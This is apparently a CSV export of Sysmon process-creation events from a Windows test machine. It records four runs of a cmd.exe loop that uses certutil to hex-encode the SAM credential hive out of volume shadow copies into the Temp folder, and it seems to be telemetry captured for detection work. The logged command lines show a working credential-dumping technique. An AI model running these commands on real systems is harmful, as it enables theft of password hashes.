Microsoft-Windows-Sysmon/Operational,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy6\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss6 2 ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,CertUtil.exe,,,,,,1,19554,10.0.22621.2506 (WinBuild.160101.0800),"MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902",C:\Windows\System32\certutil.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,CertUtil.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*",C:\Windows\System32\cmd.exe,{f57bd86a-4767-658c-a401-000000000f00},3636,WINDEV2309EVAL\User,{f57bd86a-4768-658c-ab01-000000000f00},3588,7856,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:48:56.1473966Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:48:56.146,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:48:56.1473966Z""/>
      
            
      <EventRecordID>19554</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:48:56.146</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4768-658c-ab01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">7856</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\certutil.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">CertUtil.exe</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">CertUtil.exe</Data>
      
            
      <Data Name=""CommandLine"">certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy6\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss6 2 </Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-4767-658c-a401-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">3636</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss5 2 ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,CertUtil.exe,,,,,,1,19553,10.0.22621.2506 (WinBuild.160101.0800),"MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902",C:\Windows\System32\certutil.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,CertUtil.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*",C:\Windows\System32\cmd.exe,{f57bd86a-4767-658c-a401-000000000f00},3636,WINDEV2309EVAL\User,{f57bd86a-4768-658c-aa01-000000000f00},3588,10424,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:48:56.1137381Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:48:56.112,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:48:56.1137381Z""/>
      
            
      <EventRecordID>19553</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:48:56.112</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4768-658c-aa01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10424</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\certutil.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">CertUtil.exe</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">CertUtil.exe</Data>
      
            
      <Data Name=""CommandLine"">certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss5 2 </Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-4767-658c-a401-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">3636</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss4 2 ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,CertUtil.exe,,,,,,1,19552,10.0.22621.2506 (WinBuild.160101.0800),"MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902",C:\Windows\System32\certutil.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,CertUtil.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*",C:\Windows\System32\cmd.exe,{f57bd86a-4767-658c-a401-000000000f00},3636,WINDEV2309EVAL\User,{f57bd86a-4768-658c-a901-000000000f00},3588,10584,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:48:56.0801308Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:48:56.079,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:48:56.0801308Z""/>
      
            
      <EventRecordID>19552</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:48:56.079</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4768-658c-a901-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10584</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\certutil.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">CertUtil.exe</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">CertUtil.exe</Data>
      
            
      <Data Name=""CommandLine"">certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss4 2 </Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-4767-658c-a401-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">3636</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss3 2 ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,CertUtil.exe,,,,,,1,19551,10.0.22621.2506 (WinBuild.160101.0800),"MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902",C:\Windows\System32\certutil.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,CertUtil.exe,"""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*",C:\Windows\System32\cmd.exe,{f57bd86a-4767-658c-a401-000000000f00},3636,WINDEV2309EVAL\User,{f57bd86a-4768-658c-a801-000000000f00},3588,1044,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:48:56.0459508Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:48:56.044,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:48:56.0459508Z""/>
      
            
      <EventRecordID>19551</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:48:56.044</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4768-658c-a801-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">1044</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\certutil.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">CertUtil.exe</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">CertUtil.exe</Data>
      
            
      <Data Name=""CommandLine"">certutil  -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM"" C:\Users\User\AppData\Local\Temp\SAMvss3 2 </Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=291B8C8D419BF3F836D19E165742A342,SHA256=BECCB40598D544B665F562C6CCB725D48C4BB120FA21B376487C2F5D4761DFBB,IMPHASH=323A326D7B550351B75EC637A5575902</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-4767-658c-a401-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">3636</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
